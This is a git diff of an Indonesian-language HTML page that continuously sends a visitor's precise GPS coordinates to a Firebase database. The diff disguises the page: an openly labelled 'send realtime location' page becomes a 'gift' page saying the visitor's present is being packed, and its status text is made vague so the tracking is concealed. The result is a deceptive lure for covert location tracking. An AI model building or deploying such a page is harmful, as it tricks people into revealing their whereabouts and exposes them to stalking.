@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Kirim Lokasi Realtime</title>
+  <title>Hadiah</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
@@ -17,8 +17,8 @@
   </style>
 </head>
 <body>
-  <h2>Kirim Lokasi Realtime</h2>
-  <p class="status">Mengambil lokasi...</p>
+  <h2>Hadiah anda sedang dikemas</h2>m
+  <p class="status">Tunggu beberapa saat.</p>
 
   <script type="module">
     // Firebase SDK
@@ -47,9 +47,9 @@
         lng: lng,
         waktu: new Date().toISOString()
       }).then(() => {
-        statusEl.textContent = `Lokasi dikirim: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+        statusEl.textContent = `Data sedang diproses: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
       }).catch(err => {
-        statusEl.textContent = 'Gagal kirim lokasi';
+        statusEl.textContent = 'Gagal kirim data';
         console.error(err);
       });
     };
@@ -61,7 +61,7 @@
         const lng = pos.coords.longitude;
         updateLocation(lat, lng);
       }, (err) => {
-        statusEl.textContent = "Izin lokasi ditolak atau gagal.";
+        statusEl.textContent = "Izin ditolak";
       }, {
         enableHighAccuracy: true,
         maximumAge: 5000,
